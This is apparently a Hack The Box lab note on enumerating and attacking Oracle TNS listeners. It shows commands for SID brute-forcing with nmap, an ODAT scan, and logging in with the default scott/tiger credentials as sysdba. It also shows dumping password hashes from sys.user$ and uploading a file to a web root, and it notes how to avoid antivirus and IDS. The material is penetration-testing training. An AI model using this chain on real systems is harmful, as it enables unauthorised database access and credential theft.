The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.
TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks.
As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries

Over time, TNS has been updated to support newer technologies, including `IPv6` and `SSL/TLS` encryption which makes it more suitable for the following purposes:

Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple `tnsnames.ora` file might look like this:
#### Tnsnames.ora

	ORCL = 
	   (DESCRIPTION = 
	    (ADDRESS_LIST = 
	       (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521)) 
	       ) 
	       (CONNECT_DATA = 
	         (SERVER = DEDICATED) 
	         (SERVICE_NAME = orcl) 
	         )
	    )

Here we can see a service called `ORCL`, which is listening on port `TCP/1521` on the IP address `10.129.11.102`. Clients should use the service name `orcl` when connecting to the service. However, the tnsnames.ora file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.

**On the other hand, the `listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance**

*In short, the client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener*.

Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our `Pwnbox` instance in case it does not have these already. Here is a list of commands that does all of that:

#### Testing ODAT

	AstraX01@htb[/htb]$ ./odat.py -h

Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

#### Nmap

	AstraX01@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's `SID` along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is used.

**There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others. Let us use `nmap` first.**

#### Nmap - SID Bruteforcing

	AstraX01@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations.

#### ODAT

	AstraX01@htb[/htb]$ ./odat.py all -s 10.129.204.235

#### SQLplus

	sudo apt install oracle-instantclient-sqlplus

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

	AstraX01@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

Finally, we can execute `sqlplus -v` to check if the tool will be executed without errors.

	AstraX01@htb[/htb]$ sqlplus -v

#### SQLplus - Log In

	AstraX01@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

 we found valid credentials for the user `scott` and his password `tiger` through `odat.py` tool 

There are many [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user

#### Oracle RDBMS - Interaction

	SQL> select table_name from all_tables;
	
	SQL> select * from user_role_privs;

the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.

#### Oracle RDBMS - Database Enumeration

	AstraX01@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
	
	SQL> select * from user_role_privs;

We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the `sys.user$` and try to crack them offline. The query for this would look like the following:

#### Oracle RDBMS - Extract Password Hashes

	SQL> select name, password from sys.user$;

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.

#### Oracle RDBMS - File Upload

	AstraX01@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt 
	AstraX01@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

if we know what type of system we are dealing with, we can try the default paths, which are:

| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |
Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

	AstraX01@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt 
	
	Oracle File Upload Test